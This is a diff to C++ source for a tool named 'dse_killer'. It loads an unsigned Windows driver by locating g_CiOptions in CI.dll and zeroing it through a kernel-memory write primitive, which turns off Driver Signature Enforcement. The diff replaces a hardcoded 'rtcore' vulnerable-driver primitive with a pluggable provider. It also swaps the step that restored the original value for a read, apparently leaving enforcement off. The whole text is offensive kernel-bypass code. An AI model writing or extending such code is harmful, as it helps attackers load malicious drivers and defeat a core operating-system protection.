@@ -1,6 +1,6 @@
 #include "dse_killer.h"
 
-void dse_killer::load_unsigned_driver(path driverPath)
+void dse_killer::load_unsigned_driver(provider* provider, path driverPath)
 {
 	uintptr_t g_CiOptions_Offset = get_g_CiOptions_Offset();
 	Log("The offset g_CiOptions is relative ImageBase for CI.dll 0x%llX", g_CiOptions_Offset);
@@ -10,12 +10,12 @@ void dse_killer::load_unsigned_driver(path driverPath)
 
 	uintptr_t pg_CiOptions_kernel = imageBaseCiInKernel + g_CiOptions_Offset;
 
-	rtcore::init();
+	provider->init();
 	DWORD oldValue{ 0 };
-	rtcore::write_vm(pg_CiOptions_kernel, 0x0, 1, &oldValue);
+	provider->write_kernel_memory(pg_CiOptions_kernel, 0x0, 1, &oldValue);
 	load_driver(driverPath);
-	rtcore::write_vm(pg_CiOptions_kernel, oldValue, 1);
-	rtcore::release();
+	provider->read_kernel_memory(pg_CiOptions_kernel, &oldValue, 1);
+	provider->release();
 	unload_driver(driverPath);
 }
 
